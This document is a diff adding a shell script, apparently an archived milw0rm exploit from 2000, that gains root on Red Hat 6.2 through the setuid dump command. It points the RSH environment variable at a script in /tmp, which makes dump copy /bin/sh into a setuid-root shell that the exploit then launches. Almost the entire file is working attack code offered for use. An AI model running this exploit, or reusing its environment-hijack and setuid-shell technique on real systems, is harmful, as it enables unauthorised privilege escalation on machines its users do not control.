@@ -1,0 +1,36 @@
+#!/bin/sh
+
+# Redhat 6.2 dump command executes external program 
+# with suid priviledge.
+# Discovered by Mat <mat@hacksware.com>
+# Written for and by a scriptkid Tasc ;P
+# Remember, there's no cure for BSE
+
+echo "dump-0.4b15 root exploit"
+echo "Discovered by Mat <mat@hacksware.com>"
+echo "-------------------------------------"
+echo
+DUMP=/sbin/dump
+if [ ! -u $DUMP ]; then
+  echo "$DUMP is NOT setuid on this system or does not exist at all!"
+  echo
+  exit 0
+fi
+export TAPE=iamlame:iamlame
+export RSH=/tmp/rsh
+cat >/tmp/rsh <<__eof__
+#!/bin/sh
+cp /bin/sh /tmp/sush
+chmod 4755 /tmp/sush
+}
+__eof__
+chmod 755 /tmp/rsh
+/sbin/dump -0 /
+echo
+echo "Waiting for rootshell .... 5 seconds...."
+sleep 5
+/tmp/sush
+id
+
+
+# milw0rm.com [2000-11-19]
